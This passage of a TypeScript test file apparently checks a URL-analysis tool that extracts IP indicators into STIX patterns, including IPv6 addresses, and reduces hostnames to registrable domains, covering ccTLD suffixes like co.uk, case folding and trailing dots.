  // The analyser emits a single "ip" IOC type and toStix always renders it as ipv4-addr
  // (analyze.ts:455-456), so an IPv6 host produces an invalid ipv4-addr pattern.
  it("renders IPv6 hosts as ipv6-addr patterns", () => {
    const a = analyzeUrl("http://[2001:db8::1]/login");
    expect(a.iocs).toContainEqual({ type: "ip", value: "2001:db8::1" });
    const patterns = toStix(a, created, "SB-9").objects.slice(1).map((o) => (o as { pattern: string }).pattern);
    expect(patterns).toContain("[ipv6-addr:value = '2001:db8::1']");
  });
});

/* ───────────── registrableDomain ───────────── */

describe("registrableDomain", () => {
  it("keeps one- and two-label hosts as they are", () => {
    expect(registrableDomain("localhost")).toBe("localhost");
    expect(registrableDomain("example.com")).toBe("example.com");
    expect(registrableDomain("co.uk")).toBe("co.uk");
  });

  it("takes the last two labels for ordinary TLDs", () => {
    expect(registrableDomain("www.example.com")).toBe("example.com");
    expect(registrableDomain("mail.google.com")).toBe("google.com");
    expect(registrableDomain("a.b.c.cdn-host.top")).toBe("cdn-host.top");
  });

  it("keeps three labels for second-level ccTLD suffixes", () => {
    expect(registrableDomain("asan.gov.az")).toBe("asan.gov.az");
    expect(registrableDomain("portal.asan.gov.az")).toBe("asan.gov.az");
    expect(registrableDomain("a.b.c.example.co.uk")).toBe("example.co.uk");
    expect(registrableDomain("shop.example.com.au")).toBe("example.com.au");
    expect(registrableDomain("x.y.ac.jp")).toBe("y.ac.jp");
    expect(registrableDomain("host.example.net.tr")).toBe("example.net.tr");
  });

  it("only treats the suffix as second-level when the TLD has two letters", () => {
    expect(registrableDomain("login.something.gov.com")).toBe("gov.com");
    expect(registrableDomain("a.b.co.info")).toBe("co.info");
  });

  it("lower-cases and strips a trailing dot", () => {
    expect(registrableDomain("WWW.Example.COM.")).toBe("example.com");
  });
});
